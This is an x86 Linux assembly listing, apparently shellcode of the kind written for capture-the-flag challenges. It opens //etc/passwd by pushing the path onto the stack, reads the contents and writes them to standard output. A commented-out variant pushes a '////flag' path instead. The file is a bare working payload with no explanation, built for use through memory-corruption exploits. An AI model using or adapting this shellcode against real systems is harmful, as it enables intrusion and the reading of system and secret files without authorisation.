bits 32
section .text
global _start
_start:
        xor    ecx,ecx
        mul    ecx
        mov    al,0x5
        push   ecx
        push   0x64777373 ; sswp
        push   0x61702f63 ; ap/c
        push   0x74652f2f ; te//
        ; push  0x67616c66 ; galf
        ; push  0x2f2f2f2f ; ////
        mov    ebx,esp
        int    0x80
        xchg   ebx,eax
        xchg   ecx,eax
        mov    al,0x3
        xor    edx,edx
        mov    dx,0xfff
        inc    edx
        int    0x80
        xchg   edx,eax
        xor    eax,eax
        mov    al,0x4
        mov    bl,0x1
        int    0x80
        xchg   ebx,eax
        int    0x80
